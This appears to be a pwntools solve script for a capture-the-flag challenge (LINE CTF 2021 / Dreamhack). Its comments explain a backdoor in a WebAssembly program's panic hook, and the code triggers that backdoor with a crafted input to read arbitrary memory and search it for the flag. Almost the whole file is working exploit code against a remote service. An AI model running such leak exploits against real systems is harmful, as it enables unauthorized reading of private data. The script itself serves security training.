#!/usr/bin/env python3
# ultrushawasm (LINE CTF 2021 / Dreamhack #397) - panic-hook backdoor exploit
#
# Backdoor lives in std::panicking::default_hook::__closure__ :
#   on a panic, if  mem[ msg_len*19418 + 20090 ] == "lock" (0x6B636F6C),
#   it Horner-decodes the following 24 bytes into a pointer
#       acc = (b0<<23 + b1<<22 + ... + b23) - 0x30000030   (== 805306320)
#   and dumps 15 dwords starting at that pointer to stderr.
#
# Trigger:
#   pw "1234" -> option "2" (runs setup_magic, reads /flag) -> send a long
#   verification code (>32 bytes => "index out of bounds" panic, msg_len=54).
#   base = 54*19418+20090 = 1068662. The code string lands on the heap at
#   BUFSTART, so byte (1068662-BUFSTART) inside the code == base. Plant
#   "lock"+payload there and the backdoor reads OUR bytes => arbitrary read.
#
# Usage:
#   pip install pwntools
#   python3 solve.py HOST PORT          # full auto: calibrate + dump + find flag
#   python3 solve.py HOST PORT 0x101234 # read a single address

import sys, re, time
from pwn import remote, context

context.log_level = "info"

CONST     = 805306320            # 0x30000030-ish; acc = Horner - CONST
PANIC_LEN = 54                   # length of "index out of bounds: the len is 32 but the index is 32"
BASE      = PANIC_LEN*19418 + 20090     # 1068662 : address the backdoor reads
CODELEN   = 2000                 # long enough that the heap buffer spans BASE

# Heap addr of the code string (1st copy). Stable under wasmtime; calibrate() will
# auto-correct OFF if the server's runtime differs.
DEFAULT_OFF = 511                # = BASE - 1068151

LEAK_RE = re.compile(rb'^[0-9a-fA-F]+:\s*([0-9a-fA-F]{8})\s*$', re.M)


def horner_bytes(target):
    """24 bytes b0..b23 with (b0<<23+...+b23) - CONST == target (mod 2^32)."""
    V = (target + CONST) & 0xffffffff
    b = [0]*24
    rem = V
    for i in range(24):
        w = 1 << (23 - i)
        t = min(255, rem // w)
        b[i] = t
        rem -= t * w
    acc = 0
    for x in b:
        acc = ((acc << 1) + x) & 0xffffffff
    assert (acc - CONST) & 0xffffffff == target, "encode failed (target unrepresentable?)"
    return bytes(b)


def make_code(target, off):
    code = bytearray(b"C" * CODELEN)
    code[off:off+4]     = b"lock"
    code[off+4:off+28]  = horner_bytes(target)
    return bytes(code)


def leak_raw(host, port, target, off):
    """One connection => leak 15 dwords from `target`. Returns 15 bytes (low byte of each dword)."""
    io = remote(host, port)
    try:
        io.sendline(b"1234")                     # password
        io.sendline(b"2")                        # option 2 -> setup_magic + verification code
        io.sendline(make_code(target, off))      # malicious >32-byte code -> panic -> backdoor
        time.sleep(0.4)
        data = io.recvall(timeout=3)
    finally:
        io.close()
    dwords = [int(x, 16) for x in LEAK_RE.findall(data)]
    return bytes(d & 0xff for d in dwords), data


def calibrate(host, port):
    """Find OFF by reading a known static string (salt 'XJrjzrB...' @ 0xffb41)."""
    SALT_ADDR = 0x000ffb41
    for off in [DEFAULT_OFF] + list(range(470, 560)):
        leak, _ = leak_raw(host, port, SALT_ADDR, off)
        if leak.startswith(b"XJrjzr"):
            print(f"[+] calibrated OFF = {off}  (salt leak: {leak!r})")
            return off
    raise RuntimeError("calibration failed - dump raw server output and adjust OFF/CODELEN manually")


def read_n(host, port, addr, n, off):
    """Read n bytes from addr using overlapping 15-byte leaks."""
    out = bytearray()
    while len(out) < n:
        leak, _ = leak_raw(host, port, addr + len(out), off)
        if not leak:
            break
        out += leak[:max(1, min(15, n - len(out)))]
    return bytes(out[:n])


def find_flag(host, port, off, lo=0x100000, hi=0x120000, step=15):
    """Sweep heap/data for a flag-looking string."""
    pat = re.compile(rb'(LINECTF\{[^}]*\}|DH\{[^}]*\}|flag\{[^}]*\})', re.I)
    window = bytearray()
    base_addr = lo
    addr = lo
    while addr < hi:
        leak, _ = leak_raw(host, port, addr, off)
        window += leak
        m = pat.search(bytes(window))
        if m:
            print(f"[+] FLAG @ ~{base_addr:#x}: {m.group(0).decode(errors='replace')}")
            return m.group(0)
        # keep a small tail for boundary-spanning matches
        if len(window) > 64:
            window = window[-32:]
            base_addr = addr - 32
        addr += step
        print(f"    swept up to {addr:#x}", end="\r")
    print("\n[-] flag pattern not found in range; widen lo/hi")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("usage: python3 solve.py HOST PORT [single_addr_hex]")
        sys.exit(1)
    HOST, PORT = sys.argv[1], int(sys.argv[2])

    if len(sys.argv) >= 4:
        addr = int(sys.argv[3], 0)
        off = calibrate(HOST, PORT)
        leak, raw = leak_raw(HOST, PORT, addr, off)
        print(f"[read @ {addr:#x}] {leak!r}  ascii={leak.decode(errors='replace')!r}")
    else:
        off = calibrate(HOST, PORT)
        print("[*] sweeping memory for flag ...")
        find_flag(HOST, PORT, off)
